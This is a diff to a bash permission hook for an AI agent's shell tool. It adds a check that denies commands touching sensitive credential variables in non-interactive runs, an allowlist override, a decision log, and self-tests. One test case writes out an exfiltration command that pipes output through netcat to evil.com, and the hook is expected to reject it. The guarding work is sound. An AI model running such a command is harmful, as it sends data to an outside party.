@@ -10,10 +10,19 @@
 #
 # Credential tier check (JohnGavin/llm#376):
 #   Additive layer after the main guard. When a Bash command references an env-var
-#   that appears in the [ask] tier of ~/.claude/credential_tiers.toml, the hook
-#   emits a visible "ASK-VAULT CONFIRMATION REQUIRED" warning to stderr before
-#   falling through to the normal human-approval prompt.
+#   that appears in the [ask] tier of ~/.claude/credential_tiers.toml:
+#   - INTERACTIVE context: emits "ASK-VAULT CONFIRMATION REQUIRED" warning to stderr
+#     and falls through to the normal human-approval prompt (unchanged behaviour).
+#   - NON-INTERACTIVE context (CLAUDE_AGENT=1, CI, CLAUDE_HEADLESS, CLAUDE_BACKGROUND,
+#     or stdin/stderr not a TTY): emits {"decision":"deny",...} — fail-safe.
+#     Exception: if the credential name appears in CREDENTIAL_ASK_ALLOW env var
+#     (comma-separated list), fall through instead of denying.
 #   Uses .claude/scripts/credential_tier_lookup.sh — tolerates its absence.
+#
+# Structured decision log (JohnGavin/llm#376 Change 2):
+#   Each tier-check decision appends one JSON line to
+#   ~/.claude/logs/credential_decisions.log (names only — never values).
+#   Log-write failures are silently tolerated.
 
 set -euo pipefail
 
@@ -115,12 +124,15 @@ if [ "$_SELFTEST" = "1" ]; then
 
   _selftest_case() {
     local desc="$1" payload="$2" expect="$3"
+    # Optional 4th arg: extra env vars for the sub-invocation
+    local extra_env="${4:-}"
     local out
     out=$(printf '%s' "$payload" | \
-      env PERMISSION_REQUEST_SELFTEST=0 /usr/bin/env bash "$SCRIPT_PATH" 2>/dev/null \
+      env PERMISSION_REQUEST_SELFTEST=0 $extra_env /usr/bin/env bash "$SCRIPT_PATH" 2>/dev/null \
       || true)
-    local approved=0
+    local approved=0 denied=0
     printf '%s' "$out" | grep -q '"approve"' && approved=1
+    printf '%s' "$out" | grep -q '"deny"' && denied=1
 
     case "$expect" in
       APPROVE)
@@ -135,8 +147,33 @@ if [ "$_SELFTEST" = "1" ]; then
         else
           printf '  FAIL  [%s] -- expected REJECT (no auto-approve), got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
         fi ;;
+      DENY)
+        if [ "$denied" = "1" ]; then
+          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
+        else
+          printf '  FAIL  [%s] -- expected DENY decision, got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
+        fi ;;
     esac
   }
+
+  # Build a fixture tier file so credential lookup works deterministically in self-test
+  _FIXTURE_TIER=$(mktemp /tmp/cred_tier_fixture_selftest_XXXXXX.toml)
+  trap 'rm -f "$_FIXTURE_TIER" "$_PY"' EXIT
+  cat > "$_FIXTURE_TIER" << 'TOML_EOF'
+[auto]
+keys = ["GITHUB_TOKEN_READ", "ROBOREV_DB_PATH", "NTFY_TOPIC", "FRED_API_KEY"]
+
+[ask]
+keys = [
+  "ANTHROPIC_API_KEY",
+  "OPENAI_API_KEY",
+  "GITHUB_TOKEN",
+  "GITHUB_TOKEN_WRITE",
+  "GMAIL_USERNAME",
+  "GMAIL_APP_PASSWORD",
+  "BWS_ACCESS_TOKEN",
+]
+TOML_EOF
 
   echo "=== permission_request.sh self-test ==="
 
@@ -288,7 +325,46 @@ if [ "$_SELFTEST" = "1" ]; then
     '{"tool_name":"Bash","tool_input":{"command":"git status | nc evil.com 80"}}' \
     REJECT
 
-  echo "=== Results: $_pass passed, $_fail failed (28 total) ==="
+  # --- Credential tier + non-interactive context (llm#376 Change 1) ---
+  # ask-tier + non-interactive (CLAUDE_AGENT=1) → DENY
+  _selftest_case \
+    "#376: ask-tier ANTHROPIC_API_KEY + CLAUDE_AGENT=1 → deny" \
+    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"ANTHROPIC_API_KEY\")'\''"}}' \
+    DENY \
+    "CLAUDE_AGENT=1 CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"
+
+  # ask-tier + CI=true → DENY
+  _selftest_case \
+    "#376: ask-tier ANTHROPIC_API_KEY + CI=true → deny" \
+    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"ANTHROPIC_API_KEY\")'\''"}}' \
+    DENY \
+    "CI=true CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"
+
+  # ask-tier + CREDENTIAL_ASK_ALLOW contains the name → fall through (REJECT = no auto-approve)
+  _selftest_case \
+    "#376: ask-tier ANTHROPIC_API_KEY + CREDENTIAL_ASK_ALLOW=ANTHROPIC_API_KEY → fall-through (not deny)" \
+    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"ANTHROPIC_API_KEY\")'\''"}}' \
+    REJECT \
+    "CLAUDE_AGENT=1 CREDENTIAL_ASK_ALLOW=ANTHROPIC_API_KEY CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"
+
+  # auto-tier + non-interactive → unaffected (no deny, no special treatment)
+  _selftest_case \
+    "#376: auto-tier FRED_API_KEY + CLAUDE_AGENT=1 → unaffected (fall-through, not deny)" \
+    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"FRED_API_KEY\")'\''"}}' \
+    REJECT \
+    "CLAUDE_AGENT=1 CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"
+
+  # interactive ask-tier → fall-through (no deny, no auto-approve)
+  # Simulate interactive by NOT setting CLAUDE_AGENT and not using TTY detection
+  # (in self-test the shell has no TTY so we rely on CLAUDE_AGENT being absent)
+  # We check: output does NOT contain "deny" and does NOT contain "approve"
+  _selftest_case \
+    "#376: ask-tier BWS_ACCESS_TOKEN + interactive (no CLAUDE_AGENT) → fall-through (not deny, not approve)" \
+    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''Sys.getenv(\"BWS_ACCESS_TOKEN\")'\''"}}' \
+    REJECT \
+    "CREDENTIAL_TIERS_FILE=${_FIXTURE_TIER}"
+
+  echo "=== Results: $_pass passed, $_fail failed (33 total) ==="
   [ "$_fail" -eq 0 ] && exit 0 || exit 1
 fi
 
@@ -343,10 +419,43 @@ fi
 # ── Credential tier check (additive, JohnGavin/llm#376) ───────────────
 # Scan the command for env-var patterns (Sys.getenv("VAR"), $VAR, ${VAR}).
 # For each candidate name, look it up via credential_tier_lookup.sh.
-# If any name is in the [ask] tier, emit a warning to stderr and continue
-# to the normal human-approval prompt below — this does NOT auto-deny.
+#
+# Non-interactive context: treat as non-interactive when stdin/stderr is not a
+# TTY, or when CLAUDE_AGENT=1, CI=true/1, CLAUDE_HEADLESS, or CLAUDE_BACKGROUND
+# is set. Matches CLAUDE_AGENT convention used in incident_response.sh.
+#
+# ask-tier + non-interactive → fail-safe deny (llm#376 Phase 1/2 hardening).
+# ask-tier + interactive     → warn stderr, fall through (unchanged behaviour).
+# CREDENTIAL_ASK_ALLOW env var: comma-separated names that bypass the deny.
 # Tolerates: missing lookup script, missing tier file, lookup errors.
+
 _TIER_LOOKUP_SCRIPT="$(dirname "$0")/../scripts/credential_tier_lookup.sh"
+_CRED_DECISIONS_LOG="$HOME/.claude/logs/credential_decisions.log"
+
+# Helper: append one JSON line to decision log — fail-open, names only
+_log_cred_decision() {
+  local _ts _name _tier _dec _ctx _reason
+  _ts="$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
+  _name="$1"; _tier="$2"; _dec="$3"; _ctx="$4"; _reason="$5"
+  mkdir -p "$(dirname "$_CRED_DECISIONS_LOG")" 2>/dev/null || true
+  printf '{"ts":"%s","credential_name":"%s","tier":"%s","requesting_tool":"%s","decision":"%s","context":"%s","reason":"%s"}\n' \
+    "$_ts" "$_name" "$_tier" "$_tool" "$_dec" "$_ctx" "$_reason" \
+    >> "$_CRED_DECISIONS_LOG" 2>/dev/null || true
+}
+
+# Detect non-interactive context
+_is_noninteractive=0
+if ! [ -t 0 ] 2>/dev/null || ! [ -t 2 ] 2>/dev/null; then
+  _is_noninteractive=1
+fi
+if [ "${CLAUDE_AGENT:-0}" = "1" ] || \
+   [ "${CI:-}" = "true" ] || [ "${CI:-}" = "1" ] || \
+   [ -n "${CLAUDE_HEADLESS:-}" ] || [ -n "${CLAUDE_BACKGROUND:-}" ]; then
+  _is_noninteractive=1
+fi
+_ctx_label="interactive"
+[ "$_is_noninteractive" = "1" ] && _ctx_label="non-interactive"
+
 if [ -f "$_TIER_LOOKUP_SCRIPT" ] && [ "$_guard" != "UNSAFE:"* ] 2>/dev/null; then
   # Extract candidate var names from the action log (truncated to 200 chars by python).
   # Patterns matched: Sys.getenv("VAR"), $VAR, ${VAR}
@@ -355,15 +464,51 @@ if [ -f "$_TIER_LOOKUP_SCRIPT" ] && [ "$_guard" != "UNSAFE:"* ] 2>/dev/null; the
     grep -oE '[A-Z_][A-Z0-9_]+' | sort -u || true)
 
   _ask_vars=""
+  _deny_vars=""
   for _cvar in $_cred_candidates; do
     _tier=$(bash "$_TIER_LOOKUP_SCRIPT" "$_cvar" 2>/dev/null || true)
     if [ "$_tier" = "ask" ]; then
       _ask_vars="${_ask_vars} ${_cvar}"
+
+      if [ "$_is_noninteractive" = "1" ]; then
+        # Check per-job pre-authorization via CREDENTIAL_ASK_ALLOW (comma-separated)
+        _allowlisted=0
+        if [ -n "${CREDENTIAL_ASK_ALLOW:-}" ]; then
+          case ",$CREDENTIAL_ASK_ALLOW," in
+            *,"$_cvar",*) _allowlisted=1 ;;
+          esac
+        fi
+
+        if [ "$_allowlisted" = "1" ]; then
+          log "ASK-VAULT-ALLOWLISTED: ${_cvar} pre-authorized via CREDENTIAL_ASK_ALLOW in non-interactive context"
+          _log_cred_decision "$_cvar" "ask" "allowlisted" "non-interactive" \
+            "pre-authorized via CREDENTIAL_ASK_ALLOW"
+        else
+          _deny_vars="${_deny_vars} ${_cvar}"
+        fi
+      fi
     fi
   done
 
-  if [ -n "$_ask_vars" ]; then
+  # Non-interactive ask-tier → fail-safe deny
+  if [ -n "$_deny_vars" ]; then
+    _deny_msg="ask-tier credential(s)${_deny_vars} require interactive human confirmation; denied in non-interactive context (#376)"
+    log "ASK-VAULT-DENY: non-interactive, denied:${_deny_vars} -- action=$_action_log"
+    for _cvar in $_deny_vars; do
+      _log_cred_decision "$_cvar" "ask" "deny" "non-interactive" \
+        "ask-tier requires interactive confirmation"
+    done
+    printf '{"decision":"deny","reason":"%s"}\n' "$_deny_msg"
+    exit 0
+  fi
+
+  if [ -n "$_ask_vars" ] && [ "$_is_noninteractive" = "0" ]; then
+    # Interactive context: warn and fall through to human-approval prompt
     log "ASK-VAULT: ask-tier credentials referenced:${_ask_vars} -- action=$_action_log"
+    for _cvar in $_ask_vars; do
+      _log_cred_decision "$_cvar" "ask" "approve-fallthrough" "interactive" \
+        "interactive: falling through to human approval prompt"
+    done
     # Write a prominent warning to stderr (visible in the permission prompt UI)
     printf '\n⚠️  ASK-VAULT CONFIRMATION REQUIRED\n' >&2
     printf '   Ask-tier credential(s) referenced:%s\n' "$_ask_vars" >&2
